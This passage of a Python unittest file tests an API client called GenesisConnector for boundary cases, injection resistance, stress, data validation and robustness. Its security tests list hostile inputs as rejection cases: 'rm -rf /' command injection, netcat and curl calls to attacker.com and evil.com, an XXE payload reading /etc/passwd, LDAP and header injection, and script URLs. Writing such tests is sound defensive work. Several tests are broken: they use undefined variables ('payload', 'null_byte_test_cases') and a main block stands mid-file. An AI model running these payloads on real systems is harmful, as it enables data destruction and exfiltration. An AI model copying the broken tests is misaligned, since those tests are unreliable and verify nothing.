            with self.subTest(length=length):
                long_path = 'a' * (length - len(base_url) - 1)
                long_url = f"{base_url}/{long_path}"
                
                config = {
                    'api_key': 'test',
                    'base_url': long_url
                }
                
                try:
                    result = self.connector.validate_config(config)
                    self.assertIsInstance(result, bool)
                except ValueError:
                    # Expected for excessively long URLs
                    pass

    def test_payload_size_boundaries(self):
        """
        Verify that payload formatting correctly handles and raises errors for payloads ranging from empty to 10MB, ensuring proper behavior at size boundaries.
        """
        sizes = [0, 1, 1024, 1024*1024, 10*1024*1024]  # 0B, 1B, 1KB, 1MB, 10MB
        
        for size in sizes:
            with self.subTest(size=size):
                if size == 0:
                    payload = {}
                else:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)

    def test_unicode_boundary_conditions(self):
        """
        Test that payload formatting correctly handles a range of Unicode strings, including control characters, boundary code points, and emojis, either by processing them or raising appropriate errors.
        """
        unicode_test_cases = [
            'Basic ASCII',
            'Café with accents',
            '测试中文字符',
            '🚀🌟💫 Emojis',
            'Mixed: ASCII + café + 测试 + 🚀',
            '\u0000\u0001\u0002',  # Control characters
            '\uffff\ufffe\ufffd',  # Unicode boundaries
        ]
        
        for test_string in null_byte_test_cases:
            with self.subTest(test_string=test_string):
                payload = {'message': test_string}
                
                # Should either handle gracefully or raise appropriate error
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except ValueError:
                    # Acceptable to reject null bytes
                    pass


    def test_numeric_boundary_conditions(self):
        """
        Tests payload formatting with numeric edge cases, including extreme integer and floating-point values, verifying correct serialization or appropriate exception handling.
        """
        import sys
        
        numeric_test_cases = [
            0,
            1,
            -1,
            sys.maxsize,
            -sys.maxsize - 1,
            float('inf'),
            float('-inf'),
            float('nan'),
            1e308,  # Near float max
            1e-308,  # Near float min
        ]
        
        for number in numeric_test_cases:
            with self.subTest(number=number):
                payload = {'number': number, 'message': 'test'}
                
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except (ValueError, OverflowError):
                    # Expected for some boundary cases
                    pass


if __name__ == '__main__':
    # Run all tests
    unittest.main(verbosity=2)

class TestGenesisConnectorAdvancedSecurity(unittest.TestCase):
    """
    Advanced security tests for GenesisConnector.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up security test environment."""
        self.connector = GenesisConnector()

    def test_header_injection_prevention(self):
        """Test prevention of HTTP header injection attacks."""
        malicious_headers = [
            'test\r\nX-Injected: malicious',
            'test\nX-Injected: malicious',
            'test\r\n\r\nX-Injected: malicious',
            'test\x00X-Injected: malicious',
        ]
        
        for malicious_value in malicious_headers:
            with self.subTest(value=malicious_value):
                config = {
                    'api_key': malicious_value,
                    'base_url': 'https://test.com',
                    'custom_headers': {'X-Test': malicious_value}
                }
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_command_injection_prevention(self):
        """Test prevention of command injection in configuration."""
        command_injection_payloads = [
            '; rm -rf /',
            '$(rm -rf /)',
            '`rm -rf /`',
            '| nc attacker.com 4444',
            '&& curl evil.com',
        ]
        
        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                config = {
                    'api_key': f'test{payload}',
                    'base_url': f'https://test.com{payload}'
                }
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection patterns."""
        ldap_payloads = [
            'test*)(uid=*))(|(uid=*',
            'test*)((|uid=*))',
            'test*)(objectClass=*',
        ]
        
        for payload in ldap_payloads:
            with self.subTest(payload=payload):
                config = {'api_key': payload, 'base_url': 'https://test.com'}
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks."""
        xml_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '&xxe;',
            ']]><!ENTITY xxe SYSTEM "http://evil.com">',
        ]
        
        for payload in xml_payloads:
            with self.subTest(payload=payload):
                config = {'api_key': payload, 'base_url': 'https://test.com'}
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_protocol_downgrade_prevention(self):
        """Test prevention of protocol downgrade attacks."""
        insecure_urls = [
            'http://api.test.com',  # HTTP instead of HTTPS
            'ftp://api.test.com',
            'file:///etc/passwd',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
        ]
        
        for url in insecure_urls:
            with self.subTest(url=url):
                config = {'api_key': 'test', 'base_url': url}
                
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    @patch('requests.post')
    def test_response_size_limits(self, mock_post):
        """Test handling of extremely large responses."""
        # Simulate very large response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {'Content-Length': '100000000'}  # 100MB
        mock_response.content = b'x' * (10 * 1024 * 1024)  # 10MB actual content
        mock_post.return_value = mock_response
        
        payload = {'message': 'size_test'}
        
        try:
            result = self.connector.send_request(payload)
            # Should handle large responses appropriately
            self.assertIsNotNone(result)
        except (MemoryError, ValueError) as e:
            # Acceptable to reject overly large responses
            self.assertIsInstance(e, (MemoryError, ValueError))

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks in validation."""
        import time
        
        valid_config = {
            'api_key': 'valid_key_12345',
            'base_url': 'https://api.test.com'
        }
        
        invalid_configs = [
            {'api_key': 'a', 'base_url': 'https://api.test.com'},
            {'api_key': 'invalid_key_12345', 'base_url': 'https://api.test.com'},
            {'api_key': '', 'base_url': 'https://api.test.com'},
        ]
        
        # Measure validation timing
        valid_times = []
        invalid_times = []
        
        for _ in range(10):
            start = time.time()
            try:
                self.connector.validate_config(valid_config)
            except:
                pass
            valid_times.append(time.time() - start)
            
            for invalid_config in invalid_configs:
                start = time.time()
                try:
                    self.connector.validate_config(invalid_config)
                except:
                    pass
                invalid_times.append(time.time() - start)
        
        # Timing differences should not be significant (basic timing attack resistance)
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        
        # Allow some variance but not orders of magnitude
        self.assertLess(abs(avg_valid - avg_invalid), avg_valid * 2)


class TestGenesisConnectorStressTests(unittest.TestCase):
    """
    Stress tests for GenesisConnector to test limits and stability.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up stress test environment."""
        self.connector = GenesisConnector(config={
            'api_key': 'stress_test_key',
            'base_url': 'https://api.test.com'
        })

    def test_rapid_successive_requests(self):
        """Test handling of rapid successive requests."""
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'success': True}
            mock_post.return_value = mock_response
            
            # Make 1000 rapid requests
            for i in range(1000):
                payload = {'request_id': i, 'message': 'rapid_test'}
                result = self.connector.send_request(payload)
                self.assertEqual(result['success'], True)

    def test_memory_stress_with_large_payloads(self):
        """Test memory handling with multiple large payloads."""
        import gc
        
        # Force garbage collection before test
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        large_payloads = []
        for i in range(50):
            payload = {
                'id': i,
                'large_data': 'x' * (1024 * 100),  # 100KB each
                'list_data': list(range(1000)),
                'nested': {'deep': {'data': list(range(100))}}
            }
            large_payloads.append(payload)
        
        # Process all payloads
        for payload in large_payloads:
            try:
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
            except MemoryError:
                # Acceptable under extreme memory pressure
                pass
        
        # Clean up and check memory
        del large_payloads
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Should not leak excessive objects
        object_growth = final_objects - initial_objects
        self.assertLess(object_growth, 100)

    @patch('requests.post')
    def test_error_recovery_stress(self, mock_post):
        """Test error recovery under stress conditions."""
        error_types = [
            ConnectionError("Connection failed"),
            TimeoutError("Request timeout"),
            ValueError("Invalid response"),
            RuntimeError("Server error"),
            MemoryError("Out of memory"),
        ]
        
        success_count = 0
        error_count = 0
        
        for i in range(100):
            # Randomly inject errors
            if i % 10 == 0:
                mock_post.side_effect = error_types[i % len(error_types)]
            else:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'id': i}
                mock_post.side_effect = None
                mock_post.return_value = mock_response
            
            payload = {'test_id': i}
            try:
                result = self.connector.send_request(payload)
                success_count += 1
            except Exception:
                error_count += 1
        
        # Should handle most requests successfully despite errors
        self.assertGreater(success_count, error_count)

    def test_configuration_reload_stress(self):
        """Test stress testing configuration reloads."""
        import threading
        import time
        
        def config_reloader():
            for i in range(100):
                new_config = {
                    'api_key': f'stress_key_{i}',
                    'base_url': f'https://api{i % 5}.test.com',
                    'timeout': 30 + (i % 60)
                }
                try:
                    self.connector.reload_config(new_config)
                    time.sleep(0.001)  # Small delay
                except Exception:
                    pass
        
        def request_sender():
            for i in range(50):
                with patch('requests.post') as mock_post:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'id': i}
                    mock_post.return_value = mock_response
                    
                    try:
                        result = self.connector.send_request({'id': i})
                    except Exception:
                        pass
                    time.sleep(0.002)
        
        # Run config reloads and requests concurrently
        threads = [
            threading.Thread(target=config_reloader),
            threading.Thread(target=request_sender),
            threading.Thread(target=request_sender),
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should survive concurrent operations
        self.assertIsNotNone(self.connector.config)

    def test_deep_recursion_handling(self):
        """Test handling of deeply nested data structures."""
        # Create deeply nested structure
        nested_data = {'level': 0}
        current = nested_data
        
        for i in range(100):  # 100 levels deep
            current['next'] = {'level': i + 1}
            current = current['next']
        
        current['final'] = 'deep_data'
        
        try:
            formatted = self.connector.format_payload(nested_data)
            self.assertIsNotNone(formatted)
        except (RecursionError, ValueError) as e:
            # Acceptable to reject overly deep structures
            self.assertIsInstance(e, (RecursionError, ValueError))

    def test_concurrent_operations_stress(self):
        """Test stress with many concurrent operations."""
        import concurrent.futures
        import threading
        
        results = []
        errors = []
        
        def worker(worker_id):
            try:
                with patch('requests.post') as mock_post:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'worker': worker_id}
                    mock_post.return_value = mock_response
                    
                    # Multiple operations per worker
                    for i in range(10):
                        payload = {'worker': worker_id, 'iteration': i}
                        result = self.connector.send_request(payload)
                        results.append(result)
                        
                        # Also test other operations
                        headers = self.connector.get_headers()
                        formatted = self.connector.format_payload(payload)
                        
            except Exception as e:
                errors.append(e)
        
        # Run many concurrent workers
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(worker, i) for i in range(50)]
            for future in futures:
                future.result()
        
        # Most operations should succeed
        self.assertGreater(len(results), len(errors) * 5)


class TestGenesisConnectorDataValidation(unittest.TestCase):
    """
    Enhanced data validation tests for GenesisConnector.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up data validation test environment."""
        self.connector = GenesisConnector()

    def test_json_schema_validation(self):
        """Test validation against JSON schema patterns."""
        valid_payloads = [
            {'message': 'test', 'timestamp': '2024-01-01T00:00:00Z'},
            {'data': [1, 2, 3], 'metadata': {'key': 'value'}},
            {'nested': {'deep': {'data': 'value'}}},
        ]
        
        for payload in valid_payloads:
            with self.subTest(payload=payload):
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)

    def test_data_type_coercion(self):
        """Test handling of various data type combinations."""
        mixed_payload = {
            'string': 'test',
            'integer': 42,
            'float': 3.14159,
            'boolean': True,
            'none_value': None,
            'list': [1, 'two', 3.0, True],
            'dict': {'nested': {'value': 123}},
            'bytes': b'binary_data',
            'set': {1, 2, 3},  # Non-JSON serializable
            'tuple': (1, 2, 3),  # Non-JSON serializable
        }
        
        try:
            formatted = self.connector.format_payload(mixed_payload)
            self.assertIsNotNone(formatted)
            
            # Verify that non-serializable types are handled
            self.assertIn('string', formatted)
            self.assertIn('integer', formatted)
            
        except (ValueError, TypeError) as e:
            # Acceptable to reject non-serializable data
            self.assertIsInstance(e, (ValueError, TypeError))

    def test_encoding_handling(self):
        """Test handling of various character encodings."""
        encoding_test_cases = [
            'ASCII text',
            'UTF-8: café, naïve, résumé',
            'Cyrillic: Привет мир',
            'Arabic: مرحبا بالعالم',
            'Chinese: 你好世界',
            'Japanese: こんにちは世界',
            'Emoji: 🌍🚀💫⭐',
            'Mixed: Hello 世界 🌍',
        ]
        
        for text in encoding_test_cases:
            with self.subTest(text=text):
                payload = {'message': text, 'description': f'Testing: {text}'}
                
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
                self.assertIn('message', formatted)

    def test_whitespace_handling(self):
        """Test handling of various whitespace characters."""
        whitespace_cases = [
            'normal spaces',
            'tabs\tand\ttabs',
            'newlines\nand\nmore\nnewlines',
            'carriage\rreturns',
            'mixed\t\n\r whitespace',
            '   leading spaces',
            'trailing spaces   ',
            '   both sides   ',
            '',  # empty string
            '   ',  # only spaces
            '\t\n\r',  # only whitespace chars
        ]
        
        for text in whitespace_cases:
            with self.subTest(text=repr(text)):
                payload = {'message': text, 'test': 'whitespace'}
                
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except ValueError:
                    # May reject empty/whitespace-only content
                    if not text.strip():
                        pass  # Acceptable for empty content
                    else:
                        raise

    def test_boundary_value_validation(self):
        """Test validation of boundary values for different data types."""
        import sys
        from decimal import Decimal
        
        boundary_values = [
            # Integer boundaries
            0, 1, -1, sys.maxsize, -sys.maxsize - 1,
            # Float boundaries  
            0.0, 1.0, -1.0, float('inf'), float('-inf'), float('nan'),
            # String boundaries
            '', 'a', 'a' * 1000, 'a' * 10000,
            # Special numeric values
            Decimal('0'), Decimal('999999999999.999999999999'),
            # Complex numbers
            complex(0, 0), complex(1, 1), complex(-1, -1),
        ]
        
        for value in boundary_values:
            with self.subTest(value=repr(value)):
                payload = {'boundary_value': value, 'type': type(value).__name__}
                
                try:
                    formatted = self.connector.format_payload(payload)
                    self.assertIsNotNone(formatted)
                except (ValueError, OverflowError, TypeError) as e:
                    # Some boundary values may not be serializable
                    self.assertIsInstance(e, (ValueError, OverflowError, TypeError))


class TestGenesisConnectorAdvancedIntegration(unittest.TestCase):
    """
    Advanced integration tests for complex scenarios.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up advanced integration test environment."""
        self.connector = GenesisConnector(config={
            'api_key': 'integration_test_key',
            'base_url': 'https://api.integration.test.com',
            'timeout': 30
        })

    @patch('requests.get')
    @patch('requests.post')
    def test_full_workflow_with_retries(self, mock_post, mock_get):
        """Test complete workflow with connection, requests, and retries."""
        # Setup connection mock
        mock_get_response = Mock()
        mock_get_response.status_code = 200
        mock_get_response.json.return_value = {'status': 'connected'}
        mock_get.return_value = mock_get_response
        
        # Setup request mocks with initial failures then success
        mock_post_responses = [
            Mock(status_code=500),  # First attempt fails
            Mock(status_code=502),  # Second attempt fails
            Mock(status_code=200),  # Third attempt succeeds
        ]
        mock_post_responses[2].json.return_value = {'data': 'workflow_success'}
        mock_post.side_effect = mock_post_responses
        
        # Execute workflow
        connected = self.connector.connect()
        self.assertTrue(connected)
        
        payload = {'workflow': 'integration_test', 'data': 'test_data'}
        
        try:
            result = self.connector.send_request_with_retry(payload, max_retries=3)
            self.assertEqual(result['data'], 'workflow_success')
            self.assertEqual(mock_post.call_count, 3)  # Should retry twice then succeed
        except AttributeError:
            # If retry method doesn't exist, test regular send
            with self.assertRaises(RuntimeError):
                self.connector.send_request(payload)

    @patch('requests.get')
    def test_status_monitoring_integration(self, mock_get):
        """Test integration of status monitoring with error handling."""
        status_responses = [
            {'status': 'healthy', 'version': '1.0'},
            {'status': 'degraded', 'issues': ['high_latency']},
            {'status': 'unhealthy', 'error': 'service_down'},
        ]
        
        for i, status_data in enumerate(status_responses):
            with self.subTest(status=status_data['status']):
                mock_response = Mock()
                mock_response.status_code = 200 if status_data['status'] != 'unhealthy' else 503
                mock_response.json.return_value = status_data
                mock_get.return_value = mock_response
                
                status = self.connector.get_status()
                self.assertEqual(status['status'], status_data['status'])

    def test_configuration_management_integration(self):
        """Test integration of configuration management across operations."""
        configs = [
            {'api_key': 'key1', 'base_url': 'https://api1.test.com', 'timeout': 30},
            {'api_key': 'key2', 'base_url': 'https://api2.test.com', 'timeout': 60},
            {'api_key': 'key3', 'base_url': 'https://api3.test.com', 'timeout': 90},
        ]
        
        for i, config in enumerate(configs):
            with self.subTest(config_id=i):
                # Update configuration
                self.connector.reload_config(config)
                
                # Verify configuration is applied
                self.assertEqual(self.connector.config['api_key'], config['api_key'])
                
                # Test that headers reflect new config
                headers = self.connector.get_headers()
                if 'api_key' in config:
                    self.assertIn('Authorization', headers)
                
                # Test that validation works with new config
                is_valid = self.connector.validate_config(config)
                self.assertTrue(is_valid)

    @patch('requests.post')
    def test_payload_processing_pipeline(self, mock_post):
        """Test integration of payload formatting and processing."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'processed': True}
        mock_post.return_value = mock_response
        
        # Test complex payload pipeline
        raw_data = {
            'user_input': 'Test message with special chars: <>&"\'',
            'timestamp': datetime.now(),
            'metadata': {
                'source': 'integration_test',
                'version': '1.0',
                'nested': {
                    'deep_data': list(range(100)),
                    'more_nested': {'key': 'value'}
                }
            },
            'binary_data': b'some_binary_content',
            'numbers': [1, 2.5, Decimal('3.14'), complex(1, 2)]
        }
        
        # Format payload
        formatted = self.connector.format_payload(raw_data)
        self.assertIsNotNone(formatted)
        
        # Send formatted payload
        result = self.connector.send_request(formatted)
        self.assertEqual(result['processed'], True)
        
        # Verify the payload was properly formatted in the request
        call_args = mock_post.call_args
        self.assertIsNotNone(call_args)

    def test_error_handling_integration(self):
        """Test integration of error handling across different components."""
        error_scenarios = [
            # Configuration errors
            ({'api_key': '', 'base_url': 'invalid'}, ValueError),
            # Payload errors  
            ({}, ValueError),  # Empty payload
            # Network simulation will be handled separately
        ]
        
        for config_or_payload, expected_error in error_scenarios:
            with self.subTest(data=config_or_payload):
                if 'api_key' in config_or_payload:
                    # Configuration error test
                    with self.assertRaises(expected_error):
                        self.connector.validate_config(config_or_payload)
                else:
                    # Payload error test
                    with self.assertRaises(expected_error):
                        self.connector.format_payload(config_or_payload)


class TestGenesisConnectorRobustness(unittest.TestCase):
    """
    Robustness tests for GenesisConnector resilience.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """Set up robustness test environment."""
        self.connector = GenesisConnector()

    def test_malformed_response_handling(self):
        """Test handling of various malformed server responses."""
        malformed_responses = [
            # Incomplete JSON
            '{"incomplete":',
            '{"key": "value"',
            '{"key": "value",}',  # Trailing comma
            # Invalid JSON structures
            '{key: "value"}',  # Unquoted key
            "{'key': 'value'}",  # Single quotes
            '{"key": undefined}',  # JavaScript undefined
            # Mixed content
            'text before {"key": "value"}',
            '{"key": "value"} text after',
            # Control characters
            '{"key": "value\x00"}',
            '{"key": "value\x1f"}',
            # Invalid escape sequences
            '{"key": "\\uXXXX"}',
            '{"key": "\\invalid"}',
        ]
        
        for response_text in malformed_responses:
            with self.subTest(response=response_text):
                try:
                    parsed = self.connector.parse_response(response_text)
                    # If parsing succeeds, verify result is reasonable
                    self.assertIsNotNone(parsed)
                except (ValueError, json.JSONDecodeError) as e:
                    # Expected for malformed JSON
                    self.assertIsInstance(e, (ValueError, json.JSONDecodeError))

    def test_resource_exhaustion_handling(self):
        """Test handling when system resources are exhausted."""
        # Test file descriptor exhaustion simulation
        with patch('requests.post') as mock_post:
            mock_post.side_effect = OSError("Too many open files")
            
            payload = {'message': 'resource_test'}
            
            with self.assertRaises(OSError):
                self.connector.send_request(payload)

        # Test memory exhaustion simulation
        with patch.object(self.connector, 'format_payload') as mock_format:
            mock_format.side_effect = MemoryError("Cannot allocate memory")
            
            payload = {'message': 'memory_test'}
            
            with self.assertRaises(MemoryError):
                self.connector.format_payload(payload)

    def test_network_partition_handling(self):
        """Test behavior during network partitions."""
        network_errors = [
            ConnectionError("Network is unreachable"),
            TimeoutError("Connection timeout"),
            OSError("Network is down"),
            socket.gaierror("Name or service not known"),
        ]
        
        for error in network_errors:
            with self.subTest(error=error.__class__.__name__):
                with patch('requests.post') as mock_post:
                    mock_post.side_effect = error
                    
                    payload = {'message': 'network_test'}
                    
                    with self.assertRaises(Exception):
                        self.connector.send_request(payload)

    def test_concurrent_modification_handling(self):
        """Test handling of concurrent modifications to connector state."""
        import threading
        import time
        
        results = []
        errors = []
        
        def config_modifier():
            """Continuously modify configuration."""
            for i in range(50):
                try:
                    new_config = {
                        'api_key': f'concurrent_key_{i}',
                        'base_url': f'https://api{i % 3}.test.com'
                    }
                    self.connector.reload_config(new_config)
                    time.sleep(0.001)
                except Exception as e:
                    errors.append(e)

        def operation_executor():
            """Execute operations while config is being modified."""
            for i in range(30):
                try:
                    # Try various operations
                    headers = self.connector.get_headers()
                    current_config = self.connector.config
                    
                    payload = {'concurrent_test': i}
                    formatted = self.connector.format_payload(payload)
                    
                    results.append({'headers': headers, 'config': current_config})
                    time.sleep(0.002)
                except Exception as e:
                    errors.append(e)

        # Run concurrent operations
        threads = [
            threading.Thread(target=config_modifier),
            threading.Thread(target=operation_executor),
            threading.Thread(target=operation_executor),
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should handle concurrent access gracefully
        # Allow some errors but not excessive
        self.assertLess(len(errors), len(results))

    def test_graceful_degradation(self):
        """Test graceful degradation when optional features fail."""
        # Test when logging fails
        with patch('logging.info') as mock_log:
            mock_log.side_effect = Exception("Logging failed")
            
            payload = {'message': 'log_test'}
            
            try:
                # Should continue working even if logging fails
                self.connector.log_request(payload)
            except Exception:
                # May raise exception, but should be handled gracefully
                pass

        # Test when metrics collection fails
        with patch.object(self.connector, 'get_metrics', side_effect=Exception("Metrics failed")):
            try:
                metrics = self.connector.get_metrics()
            except (Exception, AttributeError):
                # Graceful degradation - metrics are optional
                pass

    def test_state_corruption_recovery(self):
        """Test recovery from state corruption scenarios."""
        # Corrupt internal state
        original_config = self.connector.config.copy() if hasattr(self.connector, 'config') else {}
        
        # Simulate various corruption scenarios
        corruption_scenarios = [
            None,  # None config
            {},    # Empty config
            {'corrupted': True},  # Invalid config structure
            {'api_key': None, 'base_url': None},  # Null values
        ]
        
        for corrupted_state in corruption_scenarios:
            with self.subTest(corruption=corrupted_state):
                # Apply corruption
                self.connector.config = corrupted_state
                
                # Try to recover by reloading valid config
                try:
                    valid_config = {
                        'api_key': 'recovery_key',
                        'base_url': 'https://recovery.test.com'
                    }
                    self.connector.reload_config(valid_config)
                    
                    # Verify recovery
                    self.assertEqual(self.connector.config['api_key'], 'recovery_key')
                    
                except Exception:
                    # Some corruption might be unrecoverable
                    pass
                finally:
                    # Restore original state for next test
                    self.connector.config = original_config.copy()


# Additional helper functions for comprehensive testing
def run_comprehensive_test_suite():
    """Run all test suites in order with detailed reporting."""
    test_suites = [
        TestGenesisConnectorAdvancedSecurity,
        TestGenesisConnectorStressTests,
        TestGenesisConnectorDataValidation,
        TestGenesisConnectorAdvancedIntegration,
        TestGenesisConnectorRobustness,
    ]
    
    total_tests = 0
    total_failures = 0
    
    for suite_class in test_suites:
        suite = unittest.TestLoader().loadTestsFromTestCase(suite_class)
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        total_tests += result.testsRun
        total_failures += len(result.failures) + len(result.errors)
    
    print(f"\nTotal tests run: {total_tests}")
    print(f"Total failures/errors: {total_failures}")
    print(f"Success rate: {((total_tests - total_failures) / total_tests * 100):.1f}%")


if __name__ == '__main__':
    # Option to run comprehensive suite or individual tests
    import sys
    if '--comprehensive' in sys.argv:
        run_comprehensive_test_suite()
    else:
        unittest.main(verbosity=2)